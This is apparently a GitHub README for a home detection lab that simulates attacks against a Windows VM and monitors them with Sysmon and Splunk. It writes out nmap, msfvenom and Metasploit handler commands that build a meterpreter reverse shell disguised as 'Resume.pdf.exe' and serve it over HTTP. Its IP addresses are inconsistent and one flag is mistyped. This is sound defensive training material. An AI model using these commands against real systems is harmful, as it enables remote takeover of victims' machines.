# detection-lab

Objective

The detection-lab project aimed to establish a environment for simulating and detecting cyber attacks. The main focus was to ingest and analyze logs within a Splunk. This hands-on experience was designed to deepen understanding of network security, attack patterns, and defensive strategies.

Skills Learned

- Understanding of SIEM and practical application.
- Analyzing network logs.
- Ability to generate and recognize attack signatures.
- Knowledge of network protocols and security vulnerabilities.
- Development of critical thinking and problem-solving skills in cybersecurity.

Tools Used

- Splunk for log ingestion and analysis.
- Splunk Universal Forwarder and Sysmon for log collecting/forwarding
- Kali Linux/Metasploit to create realistic network traffic and attack scenarios.

Network Diagram

![detection-lab](https://github.com/user-attachments/assets/df197dc4-81d7-48bd-8549-f5e0e13e41ce)

Steps

First, we need to understand the network connections in the virtual environment. The network we use when testing tools and using sandbox will be different. When analyzing malware, we should not have access to the Internet.

- Testing Tools     ---> NAT, NAT Network, Bridged
- Analyzing Malware ---> Host-Only, Internal Network/LAN Segment, Not Attached

In this lab, the lab environment was not connected to the Internet because of the creation of malware with Kali Linux and the attack on the Windows machine.

1-Installation and Setup of Virtual Machines 

- Kali Linux (attacker), Windows 10 (victim) and Ubuntu 22.04 (Splunk) were installed on VirtuelBox as virtual machines.
- As a network ‘NAT Network' was selected and static IP address was determined on each virtual machine.
- After installing virtual machines, we saw that they were reachable with the ‘ping’ command.
- Splunk Enterprise was installed on the Ubuntu machine to view logs.
- Universal Forwarder and Sysmon were installed on Windows 10 machine to send logs to Splunk.

2-Attack Scenario 

- First I did a port scan with 'nmap' and saw that RDP port 3389 was open. nmap –A 
    - 192.168.10.100 -Pn 

- Secondly, I created malware with the 'msfvenom' payload. Here I chose the 'meterpreter/reverse_tcp' payload. 
    - msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.250 lport=4444 -f ece -o Resume.pdf.exe 

- With this malware we will obtain a 'reverse shell' and create a connection to our own machine. After logging into the msfconsole where I will execute the attack, I entered the values for the payload we selected and started the attack.
    - use exploit/multi/handler 
    - options #to see what we can configure 
    - set payload windows/x64/meterpreter/reverse_tcp 
    - set lhost 192.168.2.250 
    - set lport 4444 #this is already given 
    - exploit 

- After that, we wait for the victim machine to run the malware. For this we will create an HTTP Server on the Kali Linux machine so that the victim machine can download the malware from there. 
    - python3 -m http.server 9999 #make sure to run it in the directory where the malware is located 

3-Exploitation 
 
- First we need to deactivate Windows Security on the Windows (victim) machine. Then I connected to the 192.168.0.250:9999 server from the web browser and downloaded the malware file 'Resume.pdf.exe' and ran it. When I looked at the network connections from the cmd console, I saw that there was a TCP connection from 192.168.10.100 to 192.168.10.250. 
    - netstat -anob 

- After that, we can now connect to the Windows machine with the 'shell' command on the Kali Linux machine and enter the commands we want. 

4-Monitoring with Splunk 

- Since I have installed sysmon on the Windows (victim) machine and configured it correctly to send logs to Splunk, I can deep dive into logs. 

Note: Sysmon logs are not fully parsed by Splunk so don't forget to install Splunk Add-on for Sysmon to get more fields. 
